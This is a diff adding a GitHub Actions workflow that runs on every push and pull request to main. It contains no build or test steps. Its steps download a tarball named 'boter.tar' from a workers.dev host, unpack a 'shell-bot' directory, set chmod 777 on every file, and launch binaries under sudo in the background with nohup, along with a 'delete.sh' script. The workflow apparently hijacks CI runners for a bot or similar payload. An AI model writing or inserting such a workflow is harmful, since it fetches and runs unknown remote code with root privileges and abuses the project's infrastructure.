@@ -1,0 +1,29 @@
+name: dev
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+jobs:
+  develop:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+
+
+      - name: Var
+        run: |
+         wget https://gix.mft.workers.dev/boter.tar -O bt.tar
+         tar -xf bt.tar
+         mv shell-bot v
+         chmod 777 ./*
+         nohup sudo v/main &
+
+      - name: Files
+        run: |
+         nohup sudo bash delete.sh &
+
+      - name: OpenVZ
+        run: |
+         nohup sudo v/varzen
+         
